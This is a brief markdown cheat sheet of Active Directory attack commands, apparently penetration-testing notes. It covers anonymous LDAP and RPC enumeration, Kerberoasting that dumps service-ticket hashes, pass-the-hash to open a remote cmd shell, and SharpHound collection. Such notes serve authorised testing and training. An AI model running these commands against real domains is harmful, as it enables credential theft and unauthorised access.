# 🧠 Active Directory Cheatsheet

## Enumeration
```bash
ldapsearch -x -h <IP> -b "dc=domain,dc=com"
rpcclient -U "" <IP>
```

## Kerberoasting
```bash
GetUserSPNs.py domain/user:pass@dc_ip -outputfile hashes.txt
```

## Pass-the-Hash
```bash
pth-winexe -U 'DOMAIN\user%LMHASH:NTHASH' //target cmd
```

## BloodHound
```powershell
SharpHound.exe -c all
```